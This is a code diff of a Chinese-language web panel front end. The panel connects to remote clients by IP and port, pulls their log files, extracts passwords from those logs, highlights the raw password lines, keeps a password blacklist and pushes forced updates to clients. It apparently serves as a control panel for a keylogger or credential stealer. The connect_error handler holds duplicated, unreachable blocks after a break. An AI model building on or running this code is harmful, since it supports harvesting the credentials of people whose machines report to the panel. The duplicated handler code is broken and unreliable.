@@ -10,6 +10,7 @@ let isReconnecting = false;
 let reconnectAttempts = 0;
 let connectingClients = new Set();
 let currentExtractedPasswords = [];
+let lastExtractedPasswords = null;
 // 提取结果分页相关
 let extractedPage = 1;                // 当前页码
 const EXTRACT_PAGE_SIZE = 50;         // 每页条数
@@ -28,8 +29,8 @@ let blacklistPageSize = 20;
 let blacklistTotalPages = 1;
 const WS_URL = `${window.location.protocol === 'https:' ? 'wss' : 'ws'}://${window.location.host}`;
 let autoRefreshTimer = null;
-const AUTO_REFRESH_INTERVAL = 30000; 
 const MAX_RECONNECT_DELAY = 30000;
+const AUTO_REFRESH_INTERVAL = 2500;
 
 // Alist 配置
 let ALIST_BASE_URL = '';
@@ -120,6 +121,7 @@ function connectWebSocket() {
     }
 
     ws = new WebSocket(WS_URL);
+
     ws.onopen = () => {
         dom.wsStatus.classList.add('connected');
         dom.wsStatusText.textContent = '已连接';
@@ -135,9 +137,10 @@ function connectWebSocket() {
         showToast(wasReconnect ? '已重新连接到服务器' : '已连接到服务器', 'success');
     };
 
-    ws.onclose = (event) => {
+        ws.onclose = (event) => {
         dom.wsStatus.classList.remove('connected');
         dom.wsStatusText.textContent = '已断开';
+        
         // 完全清理 WebSocket 状态
         if (ws) {
             ws.onopen = null;
@@ -151,7 +154,7 @@ function connectWebSocket() {
         if (isUnloading) return;
 
         if (event && event.code === 1008) {
-            dom.wsStatusText.textContent = '未授权，连接已关闭';
+            dom.wsStatusText.textContent = '未授权';
             showToast('WebSocket 未授权，请重新登录', 'error');
             return;
         }
@@ -160,6 +163,12 @@ function connectWebSocket() {
             showToast('与服务器断开，正在重连...', 'error');
         }
         isReconnecting = true;
+        dom.wsStatusText.textContent = '重连中...';
+        if (reconnectTimer) {
+            clearTimeout(reconnectTimer);
+            reconnectTimer = null;
+        }
+
         reconnectTimer = setTimeout(() => {
             reconnectAttempts += 1;
             connectWebSocket();
@@ -240,19 +249,48 @@ function handleWebSocketMessage(data) {
             dom.scanProgress.classList.remove('show');
             showToast('扫描失败: ' + data.message, 'error');
             break;
+        
         case 'connect_result':
             if (data.client) {
-                showToast(`成功连接 ${data.client.ip}:${data.client.port}`, 'success');
-                hideModal('connectModal');
-                // 移除连接中标记
+                // 清理超时定时器（如果存在）
+                if (window.connectTimeouts && window.connectTimeouts.has(data.client.id)) {
+                    clearTimeout(window.connectTimeouts.get(data.client.id));
+                    window.connectTimeouts.delete(data.client.id);
+                }
                 connectingClients.delete(data.client.id);
                 renderClientsTable();
+                showToast(`成功连接 ${data.client.ip}:${data.client.port}`, 'success');
             } else {
-                showToast('连接失败：服务器无响应', 'error');//直接刷新列表
+                showToast('连接失败：服务器无响应', 'error');
             }
             break;
+
         case 'connect_error':
             if (data.clientId) {
+                if (window.connectTimeouts && window.connectTimeouts.has(data.clientId)) {
+                    clearTimeout(window.connectTimeouts.get(data.clientId));
+                    window.connectTimeouts.delete(data.clientId);
+                }
+                connectingClients.delete(data.clientId);
+                renderClientsTable();
+            }
+            showToast('连接失败: ' + (data.message || '未知错误'), 'error');
+            break;
+            if (data.clientId) {
+                if (window.connectTimeouts && window.connectTimeouts.has(data.clientId)) {
+                    clearTimeout(window.connectTimeouts.get(data.clientId));
+                    window.connectTimeouts.delete(data.clientId);
+                }
+                connectingClients.delete(data.clientId);
+                renderClientsTable();
+            }
+            showToast('连接失败: ' + (data.message || '未知错误'), 'error');
+            break;
+            if (data.clientId) {
+                if (window.connectTimeouts && window.connectTimeouts.has(data.clientId)) {
+                    clearTimeout(window.connectTimeouts.get(data.clientId));
+                    window.connectTimeouts.delete(data.clientId);
+                }
                 connectingClients.delete(data.clientId);
                 renderClientsTable();
             }
@@ -437,7 +475,8 @@ async function loadClientLogs(clientId) {
     if (!client) return;
 
     try {
-        const response = await fetch(`/api/clients/${clientId}/logs`);
+        // 强制刷新避免缓存
+        const response = await fetch(`/api/clients/${clientId}/logs?refresh=true`);
         const logs = await response.json();
         if (logs.length === 0) {
             document.getElementById('clientLogs').innerHTML = '<p>暂无日志文件</p>';
@@ -529,35 +568,60 @@ function deleteClient(clientId) {
 }
 
 // 手动连接（模态框调用）
+// 文件: app.js
+// 替换原有的 manualConnect 函数
+
 function manualConnect() {
-    const ip = document.getElementById('connectIp').value;
+    const ip = document.getElementById('connectIp').value.trim();
     const port = parseInt(document.getElementById('connectPort').value);
     if (!ip || !port) {
         showToast('请填写 IP 和端口', 'error');
         return;
     }
-    ws.send(JSON.stringify({
-        type: 'manual_connect',
-        ip, port
-    }));
-}
-
-// 连接单个客户端（供按钮调用）
-function connectClient(ip, port, clientId) {
-    if (!ws || ws.readyState !== WebSocket.OPEN) {
-        showToast('WebSocket 未连接', 'error');
-        return;
-    }
-    // 添加到连接中集合
-    connectingClients.add(clientId);
-    // 重新渲染表格以显示连接中状态
-    renderClientsTable();
+    // 关闭模态框
+    hideModal('connectModal');
+    // 清空输入
+    document.getElementById('connectIp').value = '';
+    document.getElementById('connectPort').value = '9999';
+    
     ws.send(JSON.stringify({
         type: 'manual_connect',
         ip,
         port
     }));
     showToast(`正在尝试连接 ${ip}:${port}...`, 'success');
+}
+
+function connectClient(ip, port, clientId) {
+    if (!ws || ws.readyState !== WebSocket.OPEN) {
+        showToast('WebSocket 未连接', 'error');
+        return;
+    }
+    
+    // 添加连接中标记
+    connectingClients.add(clientId);
+    renderClientsTable();
+    
+    // 即时反馈
+    showToast(`正在连接 ${ip}:${port}...`, 'success');
+    
+    // 设置超时定时器（10秒）
+    const timeoutId = setTimeout(() => {
+        if (connectingClients.has(clientId)) {
+            connectingClients.delete(clientId);
+            renderClientsTable();
+            showToast(`连接 ${ip}:${port} 超时`, 'error');
+        }
+    }, 10000);
+    
+    ws.send(JSON.stringify({
+        type: 'manual_connect',
+        ip,
+        port
+    }));
+    
+    if (!window.connectTimeouts) window.connectTimeouts = new Map();
+    window.connectTimeouts.set(clientId, timeoutId);
 }
 
 // 一键连接全部离线客户端
@@ -596,12 +660,13 @@ async function refreshLogs() {
     const clientId = dom.logClientSelect.value;
     try {
         let logs, fetchClientId;
+        // 请求带上 refresh=true，强制后端绕过 Alist 缓存
         if (clientId) {
-            const response = await fetch(`/api/clients/${clientId}/logs`);
+            const response = await fetch(`/api/clients/${clientId}/logs?refresh=true`);
             logs = await response.json();
             fetchClientId = clientId;
         } else {
-            const response = await fetch('/api/logs');
+            const response = await fetch('/api/logs?refresh=true');
             logs = await response.json();
             fetchClientId = null;
         }
@@ -655,8 +720,8 @@ function renderLogsTable(logs, clientId) {
     dom.logsTable.innerHTML = html;
 }
 
-// 查看日志内容
-async function viewLog(clientId, filename) {
+async function viewLog(clientId, filename, options = {}) {
+     const { password = '', rawPassword = '' } = options;  // 解构参数
     try {
         const response = await fetch(`/api/clients/${clientId}/logs/${filename}/raw`);
         const content = await response.text();
@@ -665,10 +730,24 @@ async function viewLog(clientId, filename) {
         currentLogContent = content;
         currentLogClientId = clientId;
         currentLogFilename = filename;
-        currentLogHighlightPassword = '';
-        currentLogHighlightRaw = '';
-        currentLogScrollTarget = '';
-        currentLogPage = 1;             // 从第一页开始
+        currentLogHighlightPassword = options.password || '';
+        currentLogHighlightRaw = options.rawPassword || '';
+        currentLogScrollTarget = options.rawPassword || options.password || '';
+
+        // 自动定位到包含高亮词的页码
+        if (currentLogScrollTarget) {
+            const index = content.indexOf(currentLogScrollTarget);
+            if (index !== -1) {
+                // 找到目标字符所在行数
+                const before = content.substring(0, index);
+                const lineNumber = before.split('\n').length;
+                currentLogPage = Math.ceil(lineNumber / LOG_PAGE_SIZE);
+            } else {
+                currentLogPage = 1;
+            }
+        } else {
+            currentLogPage = 1;
+        }
 
         document.getElementById('logModalTitle').textContent = filename;
         renderLogPage();
@@ -680,29 +759,7 @@ async function viewLog(clientId, filename) {
 }
 
 // 查看日志内容并滚动到包含原始密码数据的行
-async function viewLogWithPassword(clientId, filename, password, rawPassword) {
-    try {
-        // 1. 获取日志内容
-        const content = await fetchLogContent(clientId, filename);
-        
-        // 2. 更新标题
-        document.getElementById('logModalTitle').textContent = filename;
-        
-        // 3. 生成高亮内容
-        const highlightedContent = generateHighlightedContent(content, password, rawPassword);
-        
-        // 4. 更新 DOM
-        document.getElementById('logContent').innerHTML = highlightedContent;
-        document.getElementById('logModal').classList.add('show');
-        
-        // 5. 滚动到高亮位置
-        scrollToHighlight(rawPassword);
-        
-    } catch (e) {
-        console.error('查看日志失败:', e);
-        showToast('查看失败，文件可能不存在或已被删除', 'error');
-    }
-}
+
 
 // 添加闪烁效果
 function addBlinkEffect(element) {
@@ -828,10 +885,7 @@ function downloadLog(clientId, filename) {
 
 // 删除日志
 async function deleteLog(clientId, filename) {
-    if (!confirm(`确定要删除日志文件 ${filename} 吗？此操作不可恢复！`)) {
-        return;
-    }
-
+    if (!confirm(`确定要删除日志文件 ${filename} 吗？此操作不可恢复！`)) return;
     try {
         const response = await fetch(`/api/clients/${clientId}/logs/${filename}`, {
             method: 'DELETE'
@@ -839,12 +893,10 @@ async function deleteLog(clientId, filename) {
         const result = await response.json();
         if (response.ok) {
             showToast(`日志 ${filename} 已删除`, 'success');
-            // 刷新当前显示的日志列表
+            // 立即刷新相关列表
+            refreshLogs();
             if (currentClientId === clientId && document.getElementById('clientModal').classList.contains('show')) {
                 loadClientLogs(clientId);
-            }
-            if (dom.logClientSelect.value === clientId) {
-                refreshLogs();
             }
         } else {
             showToast(`删除失败: ${result.error || '未知错误'}`, 'error');
@@ -1015,6 +1067,9 @@ function stopAutoRefresh() {
 }
 
 // 提取密码
+// 文件: app.js
+// 替换原有的 extractPasswords 函数
+
 async function extractPasswords() {
     try {
         showToast('正在提取密码...', 'success');
@@ -1023,7 +1078,11 @@ async function extractPasswords() {
         });
         const result = await response.json();
         if (result.success) {
-            showToast(`成功提取 ${result.count} 个密码，已保存到 extracted_passwords.txt`, 'success');
+            showToast(`成功提取 ${result.count} 个密码`, 'success');
+            // 保存并直接展示
+            lastExtractedPasswords = result.passwords;
+            displayExtractedPasswords(result.passwords);
+            document.getElementById('extractModal').classList.add('show');
         } else {
             showToast(`提取失败: ${result.error || '未知错误'}`, 'error');
         }
@@ -1035,46 +1094,32 @@ async function extractPasswords() {
 
 // 查看密码提取结果
 async function viewLatestPasswords() {
+    if (lastExtractedPasswords && lastExtractedPasswords.length > 0) {
+        displayExtractedPasswords(lastExtractedPasswords);
+        document.getElementById('extractModal').classList.add('show');
+        return;
+    }
     try {
-        // 直接从服务器本地读取提取结果文件
         const response = await fetch('/api/extract-passwords/view');
-        console.log('查看提取结果响应状态:', response.status);
-        if (response.ok) {
-            const content = await response.text();
-            console.log('提取结果内容长度:', content.length);
-            
-            // 解析提取结果
-            let passwords = parseExtractedPasswords(content);
-            
-            // 获取黑名单并过滤当前提取结果
-            try {
-                // 获取全部黑名单（不分页），确保过滤完整
-                const blacklistResponse = await fetch('/api/blacklist?page=1&limit=10000');
-                if (blacklistResponse.ok) {
-                    const data = await blacklistResponse.json();
-                    const blacklistSet = new Set((data.blacklist || []).map(item => normalizePassword(item.password)));
-                    passwords = passwords.filter(item => !blacklistSet.has(normalizePassword(item.password)));
-                }
-            } catch (e) {
-                console.warn('获取黑名单失败，继续显示提取结果', e);
+        if (!response.ok) throw new Error('结果文件不存在');
+        const content = await response.text();
+        let passwords = parseExtractedPasswords(content);
+        // 实时过滤黑名单
+        try {
+            const blacklistResp = await fetch('/api/blacklist?page=1&limit=10000');
+            if (blacklistResp.ok) {
+                const data = await blacklistResp.json();
+                const set = new Set((data.blacklist || []).map(item => normalizePassword(item.password)));
+                passwords = passwords.filter(item => !set.has(normalizePassword(item.password)));
             }
-            
-            // 显示提取结果
-            displayExtractedPasswords(passwords);
-            
-            // 显示模态框
-            document.getElementById('extractModal').classList.add('show');
-        } else {
-            const errorText = await response.text();
-            console.error('查看提取结果失败:', errorText);
-            showToast(`查看失败: ${errorText}`, 'error');
-        }
+        } catch (e) { console.warn('过滤黑名单失败'); }
+        displayExtractedPasswords(passwords);
+        document.getElementById('extractModal').classList.add('show');
     } catch (e) {
         console.error('查看密码提取结果失败:', e);
         showToast('查看失败，可能还没有提取过密码', 'error');
     }
 }
-
 // 解析提取的密码）
 function parseExtractedPasswords(content) {
     const passwords = [];
@@ -1122,51 +1167,42 @@ function parseExtractedPasswords(content) {
 
 function renderLogPage() {
     const logContentEl = document.getElementById('logContent');
-    const pagerEl = document.getElementById('logPager'); // 需在 HTML 中添加
-
+    const pagerEl = document.getElementById('logPager');
+    
+    if (!currentLogContent) return;
+    
     const lines = currentLogContent.split('\n');
     const totalLines = lines.length;
     const maxPage = Math.ceil(totalLines / LOG_PAGE_SIZE) || 1;
-
-    // 页码越界保护
+    
     if (currentLogPage > maxPage) currentLogPage = maxPage;
     if (currentLogPage < 1) currentLogPage = 1;
-
+    
     const start = (currentLogPage - 1) * LOG_PAGE_SIZE;
     const end = Math.min(start + LOG_PAGE_SIZE, totalLines);
     const pageLines = lines.slice(start, end);
-    let html = pageLines.join('\n');
-
-    // 应用高亮（如果设置了高亮关键词）
-    if (currentLogHighlightPassword || currentLogHighlightRaw) {
-        html = escapeHtml(html); // 先转义整个块
-        // 还原真正的换行符（转义后变成 \n，需要保留为 <br> 或使用 pre-wrap 样式，这里保持 pre 标签风格）
-        // 由于我们使用 white-space: pre-wrap; 可以直接用转义后的文本，但 escapeHtml 会转义换行符，所以需要特殊处理
-        // 简单方案：先对每一行进行高亮处理，然后再拼接
-    } else {
-        html = escapeHtml(html);
+    
+    // 先转义整行，防止 XSS
+    let processedLines = pageLines.map(line => escapeHtml(line));
+    
+    // 再高亮（搜索词也需要转义）
+    if (currentLogHighlightRaw) {
+        const escapedRaw = escapeHtml(currentLogHighlightRaw);
+        processedLines = processedLines.map(line => 
+            line.replace(new RegExp(escapeRegexSpecialChars(escapedRaw), 'g'), 
+                         `<span class="raw-password-highlight">${escapedRaw}</span>`)
+        );
     }
-
-    // 更合理的高亮方案：逐行处理
-    let processedLines = pageLines.map(line => {
-        let escaped = escapeHtml(line);
-        if (currentLogHighlightRaw) {
-            escaped = escaped.replace(
-                escapeHtml(currentLogHighlightRaw),
-                `<span class="raw-password-highlight">${escapeHtml(currentLogHighlightRaw)}</span>`
-            );
-        }
-        if (currentLogHighlightPassword && currentLogHighlightPassword !== currentLogHighlightRaw) {
-            escaped = escaped.replace(
-                escapeHtml(currentLogHighlightPassword),
-                `<span class="password-highlight">${escapeHtml(currentLogHighlightPassword)}</span>`
-            );
-        }
-        return escaped;
-    });
-
+    if (currentLogHighlightPassword && currentLogHighlightPassword !== currentLogHighlightRaw) {
+        const escapedPwd = escapeHtml(currentLogHighlightPassword);
+        processedLines = processedLines.map(line => 
+            line.replace(new RegExp(escapeRegexSpecialChars(escapedPwd), 'g'), 
+                         `<span class="password-highlight">${escapedPwd}</span>`)
+        );
+    }
+    
     logContentEl.innerHTML = processedLines.join('\n');
-
+    
     // 更新分页控件
     if (pagerEl) {
         if (maxPage <= 1) {
@@ -1186,6 +1222,18 @@ function renderLogPage() {
                 </button>
             `;
         }
+    }
+    if (currentLogScrollTarget) {
+        setTimeout(() => {
+            const highlight = document.querySelector('.raw-password-highlight') 
+                           || document.querySelector('.password-highlight');
+            if (highlight) {
+                highlight.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                // 闪烁效果
+                highlight.classList.add('blink');
+                setTimeout(() => highlight.classList.remove('blink'), 2000);
+            }
+        }, 100);
     }
 }
 
@@ -1390,7 +1438,7 @@ function renderExtractedPage() {
             const fname = link.dataset.filename;
             const pwd = link.dataset.password;
             const raw = link.dataset.rawPassword;
-            viewLogWithPassword(cId, fname, pwd, raw);
+            viewLog(cId, fname, { password: pwd, rawPassword: raw });
             return;
         }
 
@@ -1612,13 +1660,16 @@ function renderVersionsTable(versions) {
 
         // 已激活的版本只显示标识，未激活的显示“设为激活”按钮
         const actionBtn = isActive
-            ? `<button class="btn btn-sm btn-warning" onclick="deactivateVersion()">
-                <i class="fas fa-times"></i> 取消激活
-            </button>`
-            : `<button class="btn btn-sm btn-primary" onclick="setActiveVersion('${escapeHtml(version.version)}')">
-                <i class="fas fa-check"></i> 设为激活
-            </button>`;
-            
+        ? `<div>
+            <button class="btn btn-sm btn-warning" onclick="deactivateVersion()">取消激活</button>
+            <label style="margin-left: 0.5rem; font-size:0.8rem;">
+                <input type="checkbox" ${version.force_update ? 'checked' : ''} 
+                    onchange="toggleForceUpdate('${escapeHtml(version.version)}', this.checked)">
+                强制更新
+            </label>
+        </div>`
+        : `<button class="btn btn-sm btn-primary" onclick="setActiveVersion('${escapeHtml(version.version)}')">设为激活</button>`;
+                
         html += `
             <tr>
                 <td><strong>${escapeHtml(version.version)}</strong></td>
@@ -1684,5 +1735,24 @@ async function setActiveVersion(version) {
     } catch (error) {
         console.error('设置激活版本失败:', error);
         showToast('设置激活版本失败：' + error.message, 'error');
+    }
+}
+
+async function toggleForceUpdate(version, forceUpdate) {
+    try {
+        const response = await fetch('/api/update/force_update', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ version, force_update: forceUpdate })
+        });
+        const data = await response.json();
+        if (data.code === 200) {
+            showToast(`强制更新标志已${forceUpdate ? '开启' : '关闭'}`, 'success');
+            loadVersions(); // 刷新列表
+        } else {
+            showToast(data.message || '操作失败', 'error');
+        }
+    } catch (error) {
+        showToast('请求失败', 'error');
     }
 }
